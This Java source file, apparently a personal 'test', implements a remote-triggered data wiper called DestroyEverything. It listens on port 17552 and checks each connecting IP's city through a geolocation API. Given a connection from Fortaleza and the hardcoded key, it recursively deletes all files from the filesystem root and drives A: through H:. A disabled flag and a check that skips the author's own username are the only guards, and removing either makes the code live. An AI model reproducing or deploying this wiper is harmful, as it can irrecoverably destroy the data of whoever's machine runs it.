package br.com.introcdc.tests.destroyeverything;
/*
 * Written by IntroCDC, Bruno Coelho at 13/01/2025 - 23:34
 */

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Arrays;
import java.util.List;

public class DestroyEverything {

    public static int PORT = 17552;

    public static final JsonParser PARSER = new JsonParser();
    public static final Boolean ENABLED = false;

    public static void main(String[] args) throws Exception {
        ServerSocket serverSocket = new ServerSocket(17552);
        System.out.println("Destroy Everything preparado, esperando conexão...");
        while (true) {
            Socket socket = serverSocket.accept();
            String city = auth(socket.getInetAddress().toString());
            if (city == null) {
                System.out.println("Conexão não autorizada não localizada!");
                return;
            }
            if (city.equalsIgnoreCase("Fortaleza")) {
                System.out.println("Recebido conexão de Fortaleza, recebendo chave...");
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String serverMessage;
                if ((serverMessage = reader.readLine()) != null) {
                    if (serverMessage.equals(KEY)) {
                        System.out.println("Chave recebida, detonando...");
                        destroyEverything();
                    } else {
                        System.out.println("Chave inválida!");
                    }
                } else {
                    System.out.println("Chave não recebida!");
                }
            } else {
                System.out.println("Não autenticado conexão de " + city + "!");
            }
        }
    }

    public static String auth(String ip) {
        if (ip.equals("127.0.0.1") || ip.startsWith("192.168.")) {
            return null;
        }
        try {
            JsonObject ipInfo = readJson("http://ip-api.com/json/" + ip).getAsJsonObject();
            return ipInfo.get("city").getAsString();
        } catch (Exception exception) {
            return null;
        }
    }

    static JsonElement readJson(String url) throws IOException {
        URLConnection connection = new URL(url).openConnection();
        connection.addRequestProperty("User-Agent", "IntroCDC");
        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        return PARSER.parse(reader);
    }

    public static void destroyEverything() {
        if (!ENABLED) {
            System.out.println("Destroy Everything Desativado");
            return;
        }
        if (System.getProperty("user.name").equalsIgnoreCase("Bruno")) {
            System.out.println("Destroy Everything Bloqueado de Executar neste PC!");
            return;
        }
        System.out.println("DESTROY EVERYTHING DETONADO!");
        new Thread(() -> {
            start(new File("/"));
            start(new File("A:/"));
            start(new File("B:/"));
            start(new File("C:/"));
            start(new File("D:/"));
            start(new File("E:/"));
            start(new File("F:/"));
            start(new File("G:/"));
            start(new File("H:/"));
        }).start();
    }

    public static void start(File file) {
        if (!ENABLED) {
            System.out.println("Destroy Everything Desativado");
            return;
        }
        if (System.getProperty("user.name").equalsIgnoreCase("Bruno")) {
            System.out.println("Destroy Everything Bloqueado de Executar neste PC!");
            return;
        }
        if (IGNORE.contains(file.getAbsolutePath())) {
            return;
        }
        try {
            if (file.isDirectory()) {
                try {
                    for (File otherFile : file.listFiles()) {
                        start(otherFile);
                    }
                } catch (Exception ignored) {
                }
                try {
                    deleteFileOrFolder(file.toPath());
                } catch (Exception ignored) {
                }
            } else {
                deleteFileOrFolder(file.toPath());
            }
        } catch (Exception ignored) {
        }
    }

    public static void deleteFileOrFolder(Path path) {
        if (!ENABLED) {
            System.out.println("Destroy Everything Desativado");
            return;
        }
        if (System.getProperty("user.name").equalsIgnoreCase("Bruno")) {
            System.out.println("Destroy Everything Bloqueado de Executar neste PC!");
            return;
        }
        try {
            Files.walkFileTree(path, new SimpleFileVisitor<>() {

                private FileVisitResult handleException(IOException exception) {
                    return FileVisitResult.TERMINATE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exception) throws IOException {
                    if (exception != null) {
                        return handleException(exception);
                    }
                    Files.delete(dir);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    Files.delete(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exception) {
                    return handleException(exception);
                }
            });
        } catch (Exception ignored) {
        }
    }

    public static List<String> IGNORE = Arrays.asList("/dev", "/dev/", "/proc", "/proc/", "/sys", "/sys/");

    public static String KEY = "xMtKknIQXIDFbs23grHFXARhXec7csZwiOCo4zVbNb3NQXMPqwotT4E4f6pvEZpsNKS3b4m4IdWAOPzpffUItYWjCbbbqd7KF9QRjwrYJKy862WgtOAtYOUMIa9DKZtsyFg2Z2mRUUddpP25kZkaDe59ad0ArklL";

}
